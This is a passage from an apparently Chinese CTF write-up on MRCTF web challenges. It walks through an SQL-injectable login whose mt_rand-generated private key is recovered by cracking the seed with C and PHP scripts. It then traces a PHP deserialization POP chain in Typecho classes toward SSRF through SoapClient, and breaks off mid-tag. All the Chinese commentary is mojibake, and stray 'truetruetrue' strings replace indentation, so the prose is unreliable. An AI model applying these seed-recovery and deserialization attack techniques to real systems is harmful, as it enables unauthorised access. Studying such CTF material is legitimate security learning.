class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html; charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">'Private_key'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">''</span>) || ($password == <span class="string">''</span>) ||($Private_key == <span class="string">''</span>)) &#123;</span><br><span class="line">        <span class="comment">// è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢</span></span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">'*************'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦æ˜¯è¦æ¯”è¾ƒè¿™ä¸ªç§é’¥ï¼Œé¢˜ç›®ç»™äº†å…¬é’¥ï¼Œå¯ä»¥å‘ç°ä»–ä»¬éƒ½æ˜¯<code>mt_rand()</code>ç”Ÿæˆçš„ã€‚æ‰€ä»¥åªè¦ç”¨å…¬é’¥å»è¿˜åŸç§å­ï¼Œç„¶åå†æ‰‹å·¥ç®—å‡ºç§é’¥å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *str1 = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *str2 = <span class="string">"KVQP0LdJKRaV3n9D"</span>; <span class="comment">//å…¬é’¥</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str2) ; i++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(str1) ; j++) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( str2[i] == str1[j] ) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d %d 0 %d "</span>, j, j, <span class="built_in">strlen</span>(str1)<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">42</span> <span class="number">42</span> <span class="number">0</span> <span class="number">61</span> <span class="number">41</span> <span class="number">41</span> <span class="number">0</span> <span class="number">61</span> <span class="number">52</span> <span class="number">52</span> <span class="number">0</span> <span class="number">61</span> <span class="number">37</span> <span class="number">37</span> <span class="number">0</span> <span class="number">61</span> <span class="number">3</span> <span class="number">3</span> <span class="number">0</span> <span class="number">61</span> <span class="number">35</span> <span class="number">35</span> <span class="number">0</span> <span class="number">61</span> <span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">43</span> <span class="number">43</span> <span class="number">0</span> <span class="number">61</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">61</span> <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">55</span> <span class="number">55</span> <span class="number">0</span> <span class="number">61</span> <span class="number">13</span> <span class="number">13</span> <span class="number">0</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">0</span> <span class="number">61</span> <span class="number">29</span> <span class="number">29</span> <span class="number">0</span> <span class="number">61</span></span><br></pre></td></tr></table></figure><p>ç”¨php_mt_seedè·‘å‡ºç§å­ä¸º <code>1775196155</code></p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200411232419172.png" alt="image-20200411232419172"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line">$Public_key = public_key();</span><br><span class="line">$private_key = private_key();</span><br><span class="line"><span class="keyword">echo</span> $Public_key . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $private_key;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç§é’¥ <code>XuNhoueCDCGc</code>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯phpç‰ˆæœ¬å¤§ç‰ˆæœ¬è¦å’Œé¢˜ç›®ç¯å¢ƒç›¸åŒï¼Œä¸ç„¶å¾—å‡ºçš„ç§é’¥æ˜¯ä¸ä¸€æ ·çš„</p><p>æœ€åé€šè¿‡ä¸‡èƒ½å¯†ç æ‹¿åˆ°flag</p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200411233744024.png" alt="image-20200411233744024"></p><h3 id="7-Ezpop-Revenge"><a href="#7-Ezpop-Revenge" class="headerlink" title="7.Ezpop_Revenge"></a>7.Ezpop_Revenge</h3><p>æ²¡å†™å‡ºæ¥ï¼Œå¤ç°å­¦ä¹ ä¸€ä¸‹</p><p>è¿˜æ˜¯<code>www.zip</code>æºç æ³„éœ²</p><p>flag.phpæš—ç¤ºåº”è¯¥è¦SSRF</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">   $_SESSION[<span class="string">'flag'</span>]= <span class="string">"MRCTF&#123;******&#125;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"æˆ‘æ‰Œyour problem?\nonly localhost can get flag!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ¥ç€æ‰¾ååºåˆ—çš„ä½ç½®</p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200412124013730.png" alt="image-20200412124013730"></p><p><code>Plugin.php</code>ä¸­å…³é”®çš„ä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">"MRCTF&#123;this_is_a_fake_flag&#125;"</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">'hello'</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">'world'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_Plugin</span> <span class="keyword">implements</span> <span class="title">Typecho_Plugin_Interface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'admin'</span>])) var_dump($_SESSION);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'C0incid3nc3'</span>])) &#123;</span><br><span class="line">truetruetrue<span class="keyword">if</span>(preg_match(<span class="string">"/file|assert|eval|[`\'~^?&lt;&gt;$%]+/i"</span>,base64_decode($_POST[<span class="string">'C0incid3nc3'</span>])) === <span class="number">0</span>)</span><br><span class="line">truetruetruetrueunserialize(base64_decode($_POST[<span class="string">'C0incid3nc3'</span>]));</span><br><span class="line">truetruetrue<span class="keyword">else</span> &#123;</span><br><span class="line">truetruetruetrue<span class="keyword">echo</span> <span class="string">"Not that easy."</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–ä¼šè§¦å‘ <code>__wakeup()</code> å¹¶å®ä¾‹åŒ– <code>Typecho_Db</code>ç±»ï¼Œè·Ÿè¿›<code>/var/Typecho/Db.php</code></p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200412131913212.png" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName, $prefix = <span class="string">'typecho_'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line">        $adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</span><br><span class="line">        <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">'isAvailable'</span>))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">"Adapter &#123;$adapterName&#125; is not available"</span>);<span class="comment">//__toString()</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** åˆå§‹åŒ–å†…éƒ¨å˜é‡ */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å®ä¾‹åŒ–é€‚é…å™¨å¯¹è±¡</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿæç¤ºäº† <code>__toString()</code> æ–¹æ³•ï¼Œæ¥ç€æœ</p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200412141521405.png" alt="image-20200412141521405"></p><p>åœ¨ <code>/var/Typecho/Db/Query.php</code> ä¸­<code>__toString</code>å¯è¢«åˆ©ç”¨ </p><p>å…³é”®ä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/** æ•°æ®åº“å…³é”®å­— */</span></span><br><span class="line">    <span class="keyword">const</span> KEYWORDS = <span class="string">'*PRIMARY|AND|OR|LIKE|BINARY|BY|DISTINCT|AS|IN|IS|NULL'</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $_default = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'action'</span> =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'table'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'fields'</span> =&gt; <span class="string">'*'</span>,</span><br><span class="line">        <span class="string">'join'</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">        <span class="string">'where'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'limit'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'offset'</span> =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'order'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'group'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'having'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'rows'</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(Typecho_Db_Adapter $adapter, $prefix)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = &amp;$adapter;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild = <span class="keyword">self</span>::$_default;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'action'</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'INSERT INTO '</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">                . <span class="string">'('</span> . implode(<span class="string">' , '</span>, array_keys(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) . <span class="string">')'</span></span><br><span class="line">                . <span class="string">' VALUES '</span></span><br><span class="line">                . <span class="string">'('</span> . implode(<span class="string">' , '</span>, array_values(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) . <span class="string">')'</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'limit'</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::DELETE:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'DELETE FROM '</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'where'</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::UPDATE:</span><br><span class="line">                $columns = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                        $columns[] = <span class="string">"$key = $val"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="string">'UPDATE '</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">                . <span class="string">' SET '</span> . implode(<span class="string">' , '</span>, $columns)</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'where'</span>];</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡è®¾<code>$this-&gt;_sqlPreBuild[&#39;action&#39;]</code>ä¸ºSELECTï¼Œåœ¨<code>__toString()</code>æ–¹æ³•å†…å°±ä¼šè¿”å›<code>$this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild)</code>ï¼Œè°ƒç”¨äº†<code>$this-&gt;_adapter</code>çš„<code>parseSelect()</code>æ–¹æ³•ã€‚</p><p><strong>POPé“¾é€»è¾‘ï¼š</strong></p><ul><li>ååºåˆ—åŒ–<code>HelloWorld_DB</code>ï¼Œå°±è§¦å‘äº†<code>__wakeup()</code>æ–¹æ³•ï¼Œåœ¨<code>__wakeup()</code>å†…å®ä¾‹åŒ–<code>Typecho_Db</code>å¹¶ä»¥<code>$this-&gt;coincidence[&#39;hello&#39;]</code>ä½œä¸º<code>Typecho_Db</code>çš„<code>__construct()</code>æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼›</li><li>PHPçš„æ•°ç»„æ˜¯å¯ä»¥å­˜å¯¹è±¡ï¼Œå‡è®¾<code>$this-&gt;coincidence[&#39;hello&#39;]</code>å®ä¾‹åŒ–<code>Typecho_Db_Query</code>å¯¹è±¡ï¼Œåœ¨<code>Typecho_Db</code>çš„æ„é€ æ–¹æ³•ä¸­å°†å…¶ä½œä¸ºå­—ç¬¦ä¸²ï¼Œå°±è§¦å‘äº†<code>Typecho_Db_Query</code>çš„<code>__toString()</code>æ–¹æ³•ï¼›</li><li>åœ¨<code>__toString()</code>å†…ï¼Œå¦‚æœ<code>$_sqlPreBuild[&#39;action&#39;]</code>ä¸º<code>&#39;SELECT&#39;</code>å°±ä¼šè§¦å‘<code>$_adapter</code>çš„<code>parseSelect()</code>æ–¹æ³•ï¼›</li><li>å°†<code>$_adapter</code>å®ä¾‹åŒ–ä¸º<code>SoapClient</code>ï¼Œè°ƒç”¨<code>parseSelect()</code>æ˜¯ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œè§¦å‘äº†<code>SoapClient</code>çš„<code>__call()</code>é­”æœ¯æ–¹æ³•</li><li><code>__call()</code>æ˜¯å®ç°SSRFçš„å…³é”®</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient::__call ( string $function_name , <span class="keyword">array</span> $arguments )</span><br></pre></td></tr></table></figure><p>æ¥ç€æ‰¾æ’ä»¶åœ¨å“ªé‡Œè°ƒç”¨äº†</p><p><img src="/2020/03/2020åŒ—é‚®æ 